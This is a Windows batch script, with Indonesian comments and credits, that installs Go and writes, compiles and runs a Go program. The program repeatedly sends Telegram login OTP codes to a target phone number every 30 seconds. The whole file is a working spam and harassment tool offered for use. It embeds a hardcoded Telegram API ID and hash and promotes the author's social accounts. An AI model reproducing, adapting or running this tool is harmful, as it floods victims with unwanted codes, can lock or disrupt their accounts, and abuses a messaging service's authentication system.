@echo off
title SPAM TELE 
color 0A
echo ========================================
echo     SPAM OTP TELEGRAM
echo ========================================
echo.

:: Install Go kalau belum ada
where go >nul 2>nul
if %errorlevel% neq 0 (
    echo [1/4] Installing Go...
    winget install GoLang.Go -h --accept-package-agreements
)

:: Buat folder kerja
mkdir %temp%\otpbot 2>nul
cd %temp%\otpbot

:: Buat file kode
echo [2/4] Creating OTP script...
(
echo package main
echo.
echo import (
echo     "bufio"
echo     "context"
echo     "fmt"
echo     "os"
echo     "strings"
echo     "time"
echo     "github.com/gotd/td/telegram"
echo     "github.com/gotd/td/telegram/auth"
echo     "github.com/gotd/td/tg"
echo )
echo.
echo const ( API_ID = 32337603; API_HASH = "84da2c3fb2e974153cc5e72f1e9d1f53" )
echo.
echo type sessionStorage struct{ data []byte }
echo func (s *sessionStorage) LoadSession(context.Context) ([]byte, error) { return s.data, nil }
echo func (s *sessionStorage) StoreSession(_ context.Context, d []byte) error { s.data = d; return nil }
echo.
echo type otpFlow struct{ phone string }
echo func (o *otpFlow) Phone(context.Context) (string, error) { return o.phone, nil }
echo func (o *otpFlow) Password(context.Context) (string, error) { return "", nil }
echo func (o *otpFlow) AcceptTermsOfService(context.Context, tg.HelpTermsOfService) error { return nil }
echo func (o *otpFlow) Code(context.Context, *tg.AuthSentCode) (string, error) { return "", fmt.Errorf("otp_sent") }
echo func (o *otpFlow) SignUp(context.Context) (auth.UserInfo, error) { return auth.UserInfo{}, nil }
echo.
echo var stopMe bool
echo func main() {
echo     fmt.Println("\nTOOLS SPAM OTP AKTIF BRE!! CREDIT TOOLS > @zifermodss BANTU FOLLOW TIKTOK OWNER BIAR SEMANGAT SHARE TOOLS @ziferrr")
echo     reader := bufio.NewReader(os.Stdin)
echo     for {
echo         fmt.Print("\n📱 Target phone: ")
echo         phone, _ := reader.ReadString('\n')
echo         phone = strings.TrimSpace(phone)
echo         if phone == "exit" { break }
echo         stopMe = false
echo         counter := 0
echo         fmt.Printf("\n📲 Sending OTP to %s every 30s\n", phone)
echo         fmt.Println("🛑 Type .stop to STOP\n")
echo         go func() {
echo             for {
echo                 cmd, _ := reader.ReadString('\n')
echo                 if strings.TrimSpace(cmd) == ".stop" { stopMe = true }
echo                 time.Sleep(100 * time.Millisecond)
echo             }
echo         }()
echo         for !stopMe {
echo             counter++
echo             fmt.Printf("[%s] Sending OTP #%d...\n", time.Now().Format("15:04:05"), counter)
echo             ctx := context.Background()
echo             var ss sessionStorage
echo             client := telegram.NewClient(API_ID, API_HASH, telegram.Options{SessionStorage: ^&ss})
echo             err := client.Run(ctx, func(ctx context.Context) error {
echo                 _, err := client.Auth().SendCode(ctx, phone, 0, 0, nil)
echo                 return err
echo             })
echo             if err != nil { fmt.Printf("❌ Failed: %v\n", err) 
echo             } else { fmt.Printf("✅ OTP #%d SENT!\n", counter) }
echo             for i := 0; i ^< 30 ^&^& !stopMe; i++ { time.Sleep(1 * time.Second) }
echo         }
echo         fmt.Printf("\n✅ STOPPED! Total sent: %d OTP\n", counter)
echo     }
echo }
) > main.go

:: Install library
echo [3/4] Installing MTProto library...
go mod init otp 2>nul
go get github.com/gotd/td/telegram 2>nul
go get github.com/gotd/td/telegram/auth 2>nul
go get github.com/gotd/td/tg 2>nul

:: Compile
echo [4/4] Compiling...
go build -o otp.exe main.go

:: Run
echo.
echo ========================================
echo     READY! INPUT TARGET PHONE
echo ========================================
echo.
otp.exe

pause